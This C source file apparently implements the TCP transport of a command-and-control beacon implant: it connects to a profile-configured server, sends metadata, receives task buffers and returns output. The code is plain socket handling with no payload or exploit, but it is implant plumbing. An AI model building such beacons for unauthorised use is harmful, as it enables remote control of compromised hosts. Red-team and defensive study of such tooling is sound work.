#include "tcp.h"
#include "profile.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include "debug.h"

static int g_tcp_sock = -1;

static int _tcp_connect() {
    if (g_tcp_sock != -1) return 0;

    struct hostent *server = gethostbyname(profile_get_server());
    if (server == NULL) {
        ERROR_PRINT("TCP: No such host %s\n", profile_get_server());
        return -1;
    }

    g_tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (g_tcp_sock < 0) {
        ERROR_PRINT("TCP: Error opening socket: %s\n", strerror(errno));
        return -1;
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
    serv_addr.sin_port = htons(profile_get_port());

    if (connect(g_tcp_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        ERROR_PRINT("TCP: Error connecting to %s:%d: %s\n", profile_get_server(), profile_get_port(), strerror(errno));
        close(g_tcp_sock);
        g_tcp_sock = -1;
        return -1;
    }

    DEBUG_PRINT("[+] TCP: Connected to %s:%d\n", profile_get_server(), profile_get_port());
    return 0;
}

int tcp_transport_init(beacon_state_t *state) {
    (void)state;
    return 0;
}

int tcp_transport_send_metadata(beacon_state_t *state, const uint8_t *data, size_t len) {
    (void)state;
    if (_tcp_connect() != 0) return -1;

    // TCP metadata is sent as [4 bytes length][data]
    uint32_t len_be = htonl((uint32_t)len);
    if (send(g_tcp_sock, &len_be, 4, 0) != 4) return -1;
    if (send(g_tcp_sock, data, len, 0) != (ssize_t)len) return -1;

    return 0;
}

int tcp_transport_receive_tasks(beacon_state_t *state, uint8_t **tasks, size_t *tasks_len) {
    (void)state;
    if (_tcp_connect() != 0) return -1;

    // Receive [4 bytes length]
    uint32_t len_be;
    ssize_t ret = recv(g_tcp_sock, &len_be, 4, 0);
    if (ret == 0) {
        // Connection closed
        close(g_tcp_sock);
        g_tcp_sock = -1;
        return -1;
    }
    if (ret != 4) return -1;

    uint32_t len = ntohl(len_be);
    if (len == 0 || len > 10 * 1024 * 1024) { // 10MB limit
        ERROR_PRINT("TCP: Invalid task length %u\n", len);
        return -1;
    }

    *tasks = malloc(len);
    if (!*tasks) return -1;

    size_t total_received = 0;
    while (total_received < len) {
        ret = recv(g_tcp_sock, (*tasks) + total_received, len - total_received, 0);
        if (ret <= 0) {
            free(*tasks);
            *tasks = NULL;
            close(g_tcp_sock);
            g_tcp_sock = -1;
            return -1;
        }
        total_received += ret;
    }

    *tasks_len = len;
    return 0;
}

int tcp_transport_send_output(beacon_state_t *state, const uint8_t *data, size_t len) {
    (void)state;
    if (_tcp_connect() != 0) return -1;

    // TCP output is sent as [4 bytes length][data]
    uint32_t len_be = htonl((uint32_t)len);
    if (send(g_tcp_sock, &len_be, 4, 0) != 4) return -1;
    if (send(g_tcp_sock, data, len, 0) != (ssize_t)len) return -1;

    return 0;
}

void tcp_transport_cleanup(void) {
    if (g_tcp_sock != -1) {
        close(g_tcp_sock);
        g_tcp_sock = -1;
    }
}
